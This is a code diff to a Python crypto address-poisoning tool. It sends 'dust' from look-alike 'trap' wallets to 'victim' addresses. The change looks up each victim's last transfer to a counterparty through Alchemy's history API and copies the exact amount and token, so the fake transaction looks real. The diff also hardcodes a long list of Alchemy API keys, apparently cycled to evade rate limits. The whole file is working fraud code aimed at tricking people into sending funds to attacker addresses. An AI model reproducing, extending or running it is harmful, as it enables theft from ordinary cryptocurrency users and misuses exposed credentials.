@@ -206,6 +206,40 @@ PUBLIC_RPC_FALLBACKS = {
   ],
 }
 
+# ─── Alchemy RPCs for deep history fetching ───
+ALCHEMY_RPCS = {
+    'bsc': [
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
+        'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh',
+    ],
+    'polygon': [
+        'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+        'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11',
+    ],
+    'ethereum': [
+        'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
+        'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
+        'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+        'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et',
+    ],
+}
+
 def get_web3():
     get_var = lambda name: getattr(config, name, None) or os.getenv(name)
 
@@ -294,7 +328,20 @@ def get_token_balance(address, token_symbol):
         return 0
     
 
-def choose_asset(victim, trap, preferred_asset=None):
+def choose_asset(victim, trap, preferred_asset=None, exact_amount=None, exact_asset=None):
+    # 🆕 If exact amount and asset are provided (from dashboard "dust" button), use them directly
+    if exact_amount is not None and exact_asset:
+        exact_asset_upper = exact_asset.upper()
+        # Validate the asset is supported
+        if exact_asset_upper == NATIVE_SYMBOL:
+            logger.info(f"[EXACT MODE] Using exact amount {exact_amount} wei of {exact_asset_upper}")
+            return (exact_asset_upper, exact_amount, None)
+        elif exact_asset_upper in TOKEN_CONFIG:
+            logger.info(f"[EXACT MODE] Using exact amount {exact_amount} units of {exact_asset_upper}")
+            return (exact_asset_upper, exact_amount, None)
+        else:
+            logger.warning(f"[EXACT MODE] Asset {exact_asset} not recognized, falling back to normal logic")
+    
     victim_usdc = get_token_balance(victim, "USDC")
     trap_usdc = get_token_balance(trap, "USDC")
     
@@ -415,16 +462,34 @@ def get_native_reserve_wei(chain_name):
 # ─── Modified send_dust to support detailed messaging ───
 
 # ─── Modified send_dust to support detailed messaging ───
-def send_dust(private_key, victim_address, campaign_id=None):
+def send_dust(private_key, victim_address, campaign_id=None, exact_amount=None, exact_asset=None):
     try:
         victim = w3.to_checksum_address(victim_address)
         account = w3.eth.account.from_key(private_key)
         trap = account.address
         logger.info(f"Trap: {trap} -> Victim: {victim}")
 
+        # 🆕 If no exact amount provided, fetch last transfer from blockchain
+        if exact_amount is None or exact_asset is None:
+            if campaign_id:
+                counterparty = get_counterparty_from_db(victim_address, campaign_id)
+                if counterparty:
+                    logger.info(f"Fetching last transfer from {victim_address} to {counterparty}...")
+                    fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim_address, counterparty)
+                    if fetched_asset and fetched_amount:
+                        exact_asset = fetched_asset
+                        exact_amount = fetched_amount
+                        logger.info(f"Fetched last transfer: {fetched_amount} units of {fetched_asset}")
+                    else:
+                        logger.warning("Could not fetch last transfer, falling back to preferred/default logic")
+                else:
+                    logger.warning("Could not find counterparty for victim, falling back to preferred/default logic")
+            else:
+                logger.warning("No campaign_id provided, cannot fetch last transfer")
+
         # Pass preferred_asset from environment to choose_asset
         preferred_from_env = os.getenv("DUST_ASSET")
-        asset, dust, info_msg = choose_asset(victim, trap, preferred_from_env)
+        asset, dust, info_msg = choose_asset(victim, trap, preferred_from_env, exact_amount, exact_asset)
         
         if asset is None:
             msg = info_msg or f"❌ No suitable stablecoin found to send dust from trap {trap} to victim {victim}."
@@ -717,6 +782,174 @@ def get_trap_entries_from_db(campaign_id):
         logger.error(f"Failed to fetch traps from database: {e}")
     return entries
 
+
+def get_counterparty_from_db(victim_address, campaign_id):
+    """Fetch the counterparty address for a specific victim from the traps table."""
+    if not supabase:
+        logger.error("Supabase client not initialized.")
+        return None
+    try:
+        result = supabase.table("traps")\
+            .select("counterparty_address")\
+            .eq("campaign_id", campaign_id)\
+            .eq("victim_address", victim_address.lower())\
+            .single()\
+            .execute()
+        if result.data:
+            return result.data.get("counterparty_address")
+        return None
+    except Exception as e:
+        logger.error(f"Failed to fetch counterparty for victim {victim_address}: {e}")
+        return None
+
+def fetch_last_transfer_from_blockchain(victim_address, counterparty_address):
+    """
+    Fetch the most recent transfer from victim to counterparty.
+    
+    Strategy:
+    1. Try explicit Alchemy RPCs using alchemy_getAssetTransfers (searches ENTIRE history instantly).
+    2. Fall back to global w3 (Free RPCs) using chunked eth_getLogs (safe 10k block chunks).
+    
+    Returns (asset_symbol, amount_in_smallest_units) or (None, None).
+    """
+    try:
+        victim_checksum = w3.to_checksum_address(victim_address)
+        counterparty_checksum = w3.to_checksum_address(counterparty_address)
+        victim_lower = victim_address.lower()
+        counterparty_lower = counterparty_address.lower()
+        
+        # ═══════════════════════════════════════════════════════
+        # METHOD 1: Explicit Alchemy RPCs (Instant Full History)
+        # ═══════════════════════════════════════════════════════
+        alchemy_urls = ALCHEMY_RPCS.get(CHAIN.lower(), [])
+        
+        for url in alchemy_urls:
+            try:
+                # Create a temporary Web3 instance for this specific Alchemy URL
+                alchemy_w3 = Web3(Web3.HTTPProvider(url, request_kwargs={'timeout': 10}))
+                if not alchemy_w3.is_connected():
+                    continue
+
+                categories = ['external', 'erc20']
+                if CHAIN.lower() in ('ethereum', 'polygon'):
+                    categories.append('internal')
+                
+                result = alchemy_w3.provider.make_request('alchemy_getAssetTransfers', [{
+                    'fromBlock': '0x0',
+                    'toBlock': 'latest',
+                    'fromAddress': victim_checksum,
+                    'toAddress': counterparty_checksum,
+                    'category': categories,
+                    'order': 'desc',
+                    'maxCount': '0x5',
+                    'withMetadata': False,
+                }])
+                
+                if 'result' in result and result['result'].get('transfers'):
+                    transfers = result['result']['transfers']
+                    
+                    for t in transfers:
+                        if (t.get('from', '').lower() == victim_lower and 
+                            t.get('to', '').lower() == counterparty_lower):
+                            
+                            # Native transfer
+                            if t.get('category') == 'external':
+                                value_hex = t.get('value', '0x0')
+                                value_wei = int(value_hex, 16) if isinstance(value_hex, str) else int(value_hex)
+                                if value_wei > 0:
+                                    logger.info(f"[Alchemy:{url[:30]}...] Found {NATIVE_SYMBOL} transfer: {w3.from_wei(value_wei, 'ether')}")
+                                    return (NATIVE_SYMBOL, value_wei)
+                            
+                            # ERC-20 transfer
+                            elif t.get('category') == 'erc20':
+                                # Alchemy returns exact raw hex in rawContract.value to avoid float precision loss
+                                raw_contract = t.get('rawContract', {})
+                                raw_hex = raw_contract.get('value')
+                                
+                                if raw_hex:
+                                    value_units = int(raw_hex, 16)
+                                else:
+                                    # Fallback if rawContract is missing (multiply float by decimals)
+                                    token_addr = raw_contract.get('address', '').lower()
+                                    decimals = 6 # default
+                                    for sym, addr in TOKEN_CONFIG.items():
+                                        if addr.lower() == token_addr:
+                                            decimals = config.get_token_decimals().get(sym, 6) if hasattr(config, 'get_token_decimals') else 6
+                                            break
+                                    value_units = int(float(t.get('value', 0)) * (10 ** decimals))
+                                
+                                if value_units > 0:
+                                    token_contract = raw_contract.get('address', '').lower()
+                                    for symbol, addr in TOKEN_CONFIG.items():
+                                        if addr.lower() == token_contract:
+                                            logger.info(f"[Alchemy:{url[:30]}...] Found {symbol} transfer: {value_units} units")
+                                            return (symbol, value_units)
+                                            
+                # If we got here, Alchemy worked but didn't find the transfer in the last 5
+                # We can break the loop because Alchemy searched the whole history
+                logger.info(f"[Alchemy] Searched entire history via {url[:30]}..., no match found.")
+                break 
+                
+            except Exception as e:
+                logger.debug(f"[Alchemy] Failed on {url[:30]}...: {e}")
+                continue
+        
+        # ═══════════════════════════════════════════════════════
+        # METHOD 2: Fallback to Free RPCs (Chunked eth_getLogs)
+        # Free RPCs limit log queries, so we use safe 10,000 block chunks
+        # ═══════════════════════════════════════════════════════
+        current_block = call_with_retry(w3.eth.get_block_number)
+        chunk_size = 10000  # Safe limit for free RPCs (Ankr/PublicNode)
+        max_search_blocks = 2000000 
+        
+        logger.info(f"[Fallback] Using free RPC. Searching backwards from block {current_block} in {chunk_size}-block chunks...")
+        
+        transfer_topic = w3.keccak(text="Transfer(address,address,uint256)").hex()
+        victim_topic = '0x' + victim_lower[2:].zfill(64)
+        counterparty_topic = '0x' + counterparty_lower[2:].zfill(64)
+        
+        search_block = current_block
+        blocks_searched = 0
+        
+        while blocks_searched < max_search_blocks and search_block > 0:
+            from_block = max(0, search_block - chunk_size + 1)
+            
+            try:
+                for token_symbol, token_address in TOKEN_CONFIG.items():
+                    try:
+                        logs = w3.eth.get_logs({
+                            'fromBlock': from_block,
+                            'toBlock': search_block,
+                            'address': w3.to_checksum_address(token_address),
+                            'topics': [transfer_topic, victim_topic, counterparty_topic],
+                        })
+                        
+                        if logs:
+                            latest_log = logs[-1]
+                            value = int(latest_log['data'], 16)
+                            if value > 0:
+                                logger.info(f"[Fallback] Found {token_symbol} transfer at block {latest_log['blockNumber']}: {value} units")
+                                return (token_symbol, value)
+                    except Exception:
+                        continue
+                        
+            except Exception as e:
+                logger.debug(f"[Fallback] Error scanning blocks {from_block}-{search_block}: {e}")
+            
+            blocks_searched += chunk_size
+            search_block = from_block - 1
+            
+            if blocks_searched % 100000 == 0:
+                logger.info(f"[Fallback] Searched {blocks_searched} blocks so far...")
+        
+        logger.warning(f"[Fallback] No victim→counterparty transfers found after searching {blocks_searched} blocks")
+        return (None, None)
+        
+    except Exception as e:
+        logger.error(f"[RPC] Error fetching last transfer: {e}")
+        return (None, None)
+
+
 def batch_poison(job_id=None, campaign_id=None):
     if campaign_id:
         logger.info(f"Using database for campaign {campaign_id}")
@@ -795,6 +1028,8 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser()
     parser.add_argument('--job-id', help='Job ID for tracking')
+    parser.add_argument('--exact-amount', type=int, help='Exact amount in smallest units (wei/units, e.g., 115147641 for 115.147641 USDT)')
+    parser.add_argument('--exact-asset', help='Exact asset symbol (e.g., USDT, USDC, ETH)')
     parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
     parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
     args = parser.parse_args()
@@ -808,9 +1043,13 @@ if __name__ == "__main__":
         campaign_id = os.getenv('CAMPAIGN_ID')
 
     if args.private_key and args.victim_address:
-        # 🚨 CRITICAL FIX: In single mode (used by re_poison.js), we must exit 
-        # with code 1 on failure so that Node.js execAsync correctly catches the error.
-        success = send_dust(args.private_key, args.victim_address, campaign_id=campaign_id)
+        success = send_dust(
+            args.private_key, 
+            args.victim_address, 
+            campaign_id=campaign_id,
+            exact_amount=args.exact_amount,
+            exact_asset=args.exact_asset
+        )
         if not success:
             sys.exit(1)
     else:
